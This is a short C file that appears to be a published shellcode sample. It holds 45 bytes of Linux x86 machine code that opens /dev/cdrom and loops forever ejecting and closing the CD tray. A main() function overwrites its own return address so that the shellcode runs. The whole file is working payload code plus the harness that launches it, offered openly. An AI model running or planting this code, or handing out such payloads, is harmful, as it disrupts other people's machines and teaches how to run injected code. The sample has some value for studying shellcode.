/*
 * (linux/x86) eject & close cd-rom frenzy loop (follows "/dev/cdrom" symlink) - 45 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] = 

	"\x6a\x05"              // push $0x5 
	"\x58"                  // pop %eax 
	"\x31\xc9"              // xor %ecx,%ecx 
	"\x51"                  // push %ecx 
	"\xb5\x08"              // mov $0x8,%ch 
	"\x68\x64\x72\x6f\x6d"  // push $0x6d6f7264 
	"\x68\x65\x76\x2f\x63"  // push $0x632f7665 
	"\x68\x2f\x2f\x2f\x64"  // push $0x642f2f2f 
	"\x89\xe3"              // mov %esp,%ebx 
	"\xcd\x80"              // int $0x80 
	"\x89\xc3"              // mov %eax,%ebx 
	
	//
	// <_makeio>:
	//

	"\x66\xb9\x09\x53"      // mov $0x5309,%cx 

	//
	// <_frenzy>:
	//

	"\xb0\x36"              // mov $0x36,%al 
	"\xcd\x80"              // int $0x80 
	"\xf5"                  // cmc 
	"\x72\xf5"              // jc <_makeio>
	"\x80\xc1\x10"          // add $0x10,%cl 
	"\xeb\xf4";             // jmp <_frenzy>

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}